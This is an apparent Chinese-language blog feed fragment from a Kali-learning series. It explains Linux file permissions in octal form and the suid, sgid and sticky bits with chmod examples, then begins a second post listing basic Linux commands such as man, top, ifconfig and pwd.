<div class="hljs code-wrapper"><pre><code class="hljs diff"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">rwx = <span style="color:#008080;">111</span> = <span style="color:#008080;">7</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">rw- = <span style="color:#008080;">110</span> = <span style="color:#008080;">6</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">r-x = <span style="color:#008080;">101</span> = <span style="color:#008080;">5</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">r-- = <span style="color:#008080;">100</span> = <span style="color:#008080;">4</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="5"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-wx = </span><span style="color:#008080;"><span class="hljs-deletion">011</span></span><span class="hljs-deletion"> = </span><span style="color:#008080;"><span class="hljs-deletion">3</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="6"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-w- = </span><span style="color:#008080;"><span class="hljs-deletion">010</span></span><span class="hljs-deletion"> = </span><span style="color:#008080;"><span class="hljs-deletion">2</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="7"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">--x = </span><span style="color:#008080;"><span class="hljs-deletion">001</span></span><span class="hljs-deletion"> = </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="8"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-comment">--- = </span><span style="color:#008080;"><span class="hljs-comment">000</span></span><span class="hljs-comment"> = </span><span style="color:#008080;"><span class="hljs-comment">0</span></span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>由上可以得出，每个属组的所有的权限都可以用一位八进制数表示，每个数字都代表了不同的权限（权值）。如 最高的权限为是7，代表可读，可写，可执行。</p>

<p>故 如果我们将每个属组的权限都用八进制数表示，则文件的权限可以表示为三位八进制数</p>

<div class="hljs code-wrapper"><pre><code class="hljs diff"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rw------- =  </span><span style="color:#008080;"><span class="hljs-deletion">600</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rw-rw-rw- =  </span><span style="color:#008080;"><span class="hljs-deletion">666</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwxrwxrwx =  </span><span style="color:#008080;"><span class="hljs-deletion">777</span></span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>关于第一位最高位的解释：&nbsp;上面我们说到了权限表示中后九位的含义，剩下的第一位代表的是文件的类型，类型可以是下面几个中的一个：</p>

<div class="hljs code-wrapper"><pre><code class="hljs perl"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">d代表的是目录<em>(directroy)</em></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">-代表的是文件<em>(regular file)</em></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-keyword">s</span>代表的是套字文件<em>(<span class="hljs-keyword">socket</span>)</em></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">p代表的管道文件<em>(<span class="hljs-keyword">pipe</span>)</em>或命名管道文件<em>(named <span class="hljs-keyword">pipe</span>)</em></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="5"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">l代表的是符号链接文件<em>(symbolic <span class="hljs-keyword">link</span>)</em></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="6"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">b代表的是该文件是面向块的设备文件<em>(block-oriented device file)</em></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="7"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">c代表的是该文件是面向字符的设备文件<em>(charcter-oriented device file)</em></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<h2 id="十二位权限（Linux附加权限）"><a href="#十二位权限（Linux附加权限）" class="headerlink" title="十二位权限（Linux附加权限）"></a>十二位权限（Linux附加权限）</h2></h2><h3 id="附加权限相关概念"><a href="#附加权限相关概念" class="headerlink" title="附加权限相关概念"></a>附加权限相关概念</h3></h3><p>&nbsp;</p>

<p>linux除了设置正常的读写操作权限外，还有关于一类设置也是涉及到权限，叫做Linxu附加权限。包括 SET位权限（suid，sgid）和粘滞位权限（sticky）。</p>

<p>&nbsp;</p>

<p>SET位权限：</p>

<p>suid/sgid是为了使“没有取得特权用户要完成一项必须要有特权才可以执行的任务”而产生的。 一般用于给可执行的程序或脚本文件进行设置，其中SUID表示对属主用户增加SET位权限，SGID表示对属组内用户增加SET位权限。执行文件被设置了SUID、SGID权限后，任何用户执行该文件时，将获得该文件属主、属组账号对应的身份。在许多环境中，suid 和 sgid 很管用，但是不恰当地使用这些位可能使系统的安全遭到破坏。所以应该尽量避免使用SET位权限程序。（passwd 命令是为数不多的必须使用“suid”的命令之一）。</p>

<ul><li>suid(set User ID,set UID)的意思是进程执行一个文件时通常保持进程拥有者的UID。然而，如果设置了可执行文件的suid位，进程就获得了该文件拥有者的UID。</li>
    <li>sgid(set Group ID,set GID)意思也是一样，只是把上面的进程拥有者改成进程组就好了。</li>
</ul><p>SET位权限表示形式（10位权限）：</p>

<p>如果一个文件被设置了suid或sgid位，会分别表现在所有者或同组用户的权限的可执行位上；如果文件设置了suid还设置了x（执行）位，则相应的执行位表示为s(小写)。但是，如果没有设置x位，它将表示为S(大写)。如：</p>

<div class="hljs code-wrapper"><pre><code class="hljs sql"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span style="color:#008080;">1</span>、-rwsr-xr-x 表示设置了suid，且拥有者有可执行权限</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span style="color:#008080;">2</span>、-rwSr<span class="hljs-comment">--r-- 表示suid被设置，但拥有者没有可执行权限</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span style="color:#008080;">3</span>、-rwxr-sr-x 表示sgid被设置，且群组用户有可执行权限</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span style="color:#008080;">4</span>、-rw-r-Sr<span class="hljs-comment">-- 表示sgid被设置，但群组用户没有可执行权限</span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>设置方式：</p>

<p>SET位权限可以通过chmod命令设置，给文件加suid和sgid的命令如下(类似于上面chmod赋予一般权限的命令)：</p>

<div class="hljs code-wrapper"><pre><code class="hljs perl"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><strong><span class="hljs-keyword">chmod</span></strong> u+<strong><span class="hljs-keyword">s</span></strong> filename     设置suid位</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><strong><span class="hljs-keyword">chmod</span></strong> u-<strong><span class="hljs-keyword">s</span></strong> filename     去掉suid设置</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><strong><span class="hljs-keyword">chmod</span></strong> g+<strong><span class="hljs-keyword">s</span></strong> filename     设置sgid位</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><strong><span class="hljs-keyword">chmod</span></strong> g-<strong><span class="hljs-keyword">s</span></strong> filename     去掉sgid设置</div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>粘滞位权限：</p>

<p>&nbsp;</p>

<p>粘滞位权限即sticky。一般用于为目录设置特殊的附加权限，当目录被设置了粘滞位权限后，即便用户对该目录有写的权限，也不能删除该目录中其他用户的文件数据。设置了粘滞位权限的目录，是用ls查看其属性时，其他用户权限处的x将变为t。 使用chmod命令设置目录权限时，+t、-t权限模式可分别用于添加、移除粘滞位权限。</p>

<p>粘滞位权限表示形式（10位权限）：</p>

<p>一个文件或目录被设置了粘滞位权限，会表现在其他组用户的权限的可执行位上。如果文件设置了sticky还设置了x（执行）位，其他组用户的权限的可执行位为t(小写)。但是，如果没有设置x位，它将表示为T(大写)。如：</p>

<div class="hljs code-wrapper"><pre><code class="hljs sql"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span style="color:#008080;">1</span>、-rwsr-xr-<span style="color:#0086b3;">t</span> 表示设置了粘滞位且其他用户组有可执行权限</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span style="color:#008080;">2</span>、-rwSr<span class="hljs-comment">--r-</span><span style="color:#0086b3;"><span class="hljs-comment">T</span></span><span class="hljs-comment"> 表示设置了粘滞位但其他用户组没有可执行权限</span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>设置方式：</p>

<p>sticky权限同样可以通过chmod命令设置：</p>

<blockquote>
<p>chmod +t &lt;文件列表..&gt;</p>
</blockquote>

<h3 id="十二位的权限表示方法"><a href="#十二位的权限表示方法" class="headerlink" title="十二位的权限表示方法"></a>十二位的权限表示方法</h3></h3><p>附加权限除了用十位权限形式表示外，还可以用用十二位字符表示。</p>

<div class="hljs code-wrapper"><pre><code class="hljs"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span style="color:#008080;">11</span> <span style="color:#008080;">10</span> <span style="color:#008080;">9</span> <span style="color:#008080;">8</span> <span style="color:#008080;">7</span> <span style="color:#008080;">6</span> <span style="color:#008080;">5</span> <span style="color:#008080;">4</span> <span style="color:#008080;">3</span> <span style="color:#008080;">2</span> <span style="color:#008080;">1</span> <span style="color:#008080;">0</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">S  G  T r w x r w x r w x</div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>SGT分别表示SUID权限、SGID权限、和 粘滞位权限，这十二位分别对应关系如下：</p>

<p>第11位为SUID位，第10位为SGID位，第9位为sticky位，第8-0位对应于上面的三组rwx位（后九位）。</p>

<p>在这十二位的每一位上都置值。如果有相应的权限则为1， 没有此权限则为0。</p>

<div class="hljs code-wrapper"><pre><code class="hljs diff"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rw-r-sr-- 的值为： </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwsr-xr-x 的值为： </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwsr-sr-x 的值为： </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwsr-sr-t 的值为： </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion">  </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>如果将则前三位SGT也转换成一个二进制数，则</p>

<ul><li>suid 的八进制数字是4</li>
    <li>sgid 的代表数字是 2</li>
    <li>sticky 位代表数字是1</li>
</ul><p>这样我们就可以将十二位权限三位三位的转化为4个八进制数。其中</p>

<ul><li>最高的一位八进制数就是suid，sgdi，sticky的权值。</li>
    <li>第二位为 拥有者的权值</li>
    <li>第三位为 所属组的权值</li>
    <li>最后一位为 其他组的权值</li>

<h3 id="附加权限的八进制形式"><a href="#附加权限的八进制形式" class="headerlink" title="附加权限的八进制形式"></a>附加权限的八进制形式</h3></h3><p>&nbsp;</p>

<p>通过上面，我们知道，正常权限和附加权限可以用4位八进制数表示。类似于正常权限的数字权限赋值模式（使用三位八进制数字赋值）</p>

<blockquote>
<p>chmod &lt;abc&gt; file...</p>
</blockquote>

<p>我们可以进一步使用4位八进制数字同时赋值正常权限和附加权限。</p>

<blockquote>
<p>chmod &lt;sabc&gt; file...</p>
</blockquote>

<p>其中s是表示附加权限的把八进制数字，abc与之前一致，分别是对应User、Group、及Other（拥有者、群组、其他组）的权限。因为SUID对应八进制数字是4，SGID对于八进制数字是2，则“4755”表示设置SUID权限，“6755”表示同时设置SUID、SGID权限。</p>

<p>我们进一步将上小节的例子中的二进制数转变为八进制表示形式，则</p>

<div class="hljs code-wrapper"><pre><code class="hljs diff"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rw-r-sr-- = </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> = </span><span style="color:#008080;"><span class="hljs-deletion">2644</span></span><span class="hljs-deletion"> </span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwsr-xr-x = </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> = </span><span style="color:#008080;"><span class="hljs-deletion">4755</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwsr-sr-x = </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> = </span><span style="color:#008080;"><span class="hljs-deletion">6755</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwsr-sr-t = </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">0</span></span><span class="hljs-deletion"> </span><span style="color:#008080;"><span class="hljs-deletion">1</span></span><span class="hljs-deletion"> = </span><span style="color:#008080;"><span class="hljs-deletion">7755</span></span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>对比范例：</p>

<ul><li>设置 netlogin 的权限为拥有者可读写执行，群组和其他权限为可读可执行</li>
</ul><div class="hljs code-wrapper"><pre><code class="hljs perl"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-keyword">chmod</span> <span style="color:#008080;"><span class="hljs-number">755</span></span> netlogin</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"> </div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<ul><li>设置 netlogin 的权限为拥有者可读写执行，群组和其他权限为可读可执行，并且设置suid</li>
</ul><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-keyword">chmod</span> <span style="color:#008080;"><span class="hljs-number">4755</span></span> netlogin</code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>chmod 4755与chmod 755对比多了附加权限值4，这个4表示其他用户执行文件时，具有与所有者同样的权限（设置了SUID）。</p>

<blockquote>
<p>为什么要设置4755 而不是 755？&nbsp;<br>
假设netlogin是root用户创建的一个上网认证程序，如果其他用户要上网也要用到这个程序，那就需要root用户运行chmod 755 netlogin命令使其他用户也能运行netlogin。但假如netlogin执行时需要访问一些只有root用户才有权访问的文件，那么其他用户执行netlogin时可能因为权限不够还是不能上网。这种情况下，就可以用 chmod 4755 netlogin 设置其他用户在执行netlogin也有root用户的权限，从而顺利上网。</p>
</blockquote>

<br>

<br>
<br>
<br>
<br>
<br>
<br>]]></content>
      <categories>
        <category>kali学习</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>重拾kali2</title>
    <url>/article/1b0f5c55.html</url>
    <content><![CDATA[<h2 id="简单常见的命令"><a href="#简单常见的命令" class="headerlink" title="简单常见的命令"></a>简单常见的命令</h2><p>这里只介绍常用的，Linux下有很多命令的，遇到不会的，可以去这里查找Linux下的命令<a href="http://linux.51yip.com/" target="_blank" rel="noopener">Linux命令手册</a></p>
<h3 id="1、帮助命令"><a href="#1、帮助命令" class="headerlink" title="1、帮助命令"></a>1、帮助命令</h3><p>在Linux环境中，如果遇到困难，可以使用帮助命令来获取帮助。<br><font size="3" color="red">help命令</font><br>help命令用于显示shell内部命令的帮助信息。<br>help命令只能显示shell内部的命令帮助信息，而对于外部命令的帮助信息只能使用man或者info命令查看。</p>
<a id="more"></a>

<p><font size="3" color="red">man命令</font><br>man [选项]<br>man 没有内建与外部命令的区分，因为 man 工具是显示系统手册页中的内容，也就是一本电子版的字典，这些内容大多数都是对命令的解释信息，还有一些相关的描述。通过查看系统文档中的 man 也可以得到程序的更多相关信息和 Linux 的更多特性。</p>
<p><font size="3" color="red">info命令</font><br>用法: info [选项]<br>以 Info 格式阅读文档。</p>
<h3 id="2、常用系统工作命令"><a href="#2、常用系统工作命令" class="headerlink" title="2、常用系统工作命令"></a>2、常用系统工作命令</h3><p>Linux中有一些是常用的系统工作命令。<br><font size="3" color="red">echo命令</font><br>echo命令用于在终端输出字符串或变量提取后的值,格式为“echo[字符串 | $变量]”。</p>
<p><font size="3" color="red">date命令</font><br>date命令用于显示及设置系统的时间或日期，格式为“date [选项][+指定的格式]”</p>
<p><font size="3" color="red">poweroff命令</font><br>poweroff命令用于关闭系统，其格式为poweroff。</p>
<p><font size="3" color="red">top命令</font><br>显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率等，其格式为“top [参数]”。<br>这个命令在渗透测试中还是很有用的，它可以查看我们的命令是否执行了。</p>
<h3 id="3、系统状态检测命令"><a href="#3、系统状态检测命令" class="headerlink" title="3、系统状态检测命令"></a>3、系统状态检测命令</h3><p>在Linux有一些可以查看Linux配置系统的基本命令。<br><font size="3" color="red">ifconfig命令</font><br>ifconfig命令用于获取网卡配置与网络状态等信息，格式为“ifconfig [网络设备] | [参数]”<br>ifconfig是一个用来查看、配置、启用或禁用网络接口的工具，这个工具极为常用的。</p>
<p><font size="3" color="red">uname命令</font><br>uname命令用于查看系统内核与系统版本等信息，格式为“uname [-a]”。</p>
<p><font size="3" color="red">who命令</font><br>who用于查看当前登入主机的用户终端信息，格式为“who [参数]”。</p>
<p><font size="3" color="red">history命令</font><br>history命令用于显示历史执行过的命令，格式为“history [-c]”。</p>
<p><font size="3" color="red">last命令</font><br>last命令用于查看目前与过去登入系统的用户相关信息。<br>linux系统中last命令的作用是显示近期用户或终端的登录情况，它的使用权限是所有用户。通过last命令查看该程序的log，管理员可以获知谁曾经或企图连接系统。</p>
<h3 id="4、工作目录切换命令"><a href="#4、工作目录切换命令" class="headerlink" title="4、工作目录切换命令"></a>4、工作目录切换命令</h3><p>在Linux中，工作目录指的是用户当前在系统中所处的位置。<br><font size="3" color="red">pwd命令</font><br>pwd命令用于显示用户当前所处的工作目录，格式为“pwd [选项]”。</p>
